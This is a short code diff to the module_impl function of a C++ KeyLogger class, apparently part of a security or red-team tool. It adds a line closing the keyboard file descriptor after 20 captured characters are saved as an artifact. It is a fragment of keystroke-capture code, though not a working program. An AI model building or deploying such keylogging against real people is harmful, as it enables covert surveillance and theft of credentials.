@@ -107,6 +107,7 @@ void KeyLogger::module_impl()
     if (chars_to_send.length() == 20) {
         ret_json[module_type] = chars_to_send;
         save_artifact(ret_json);
+        close(keyboard_fd);
         run_ = false;
     }
 
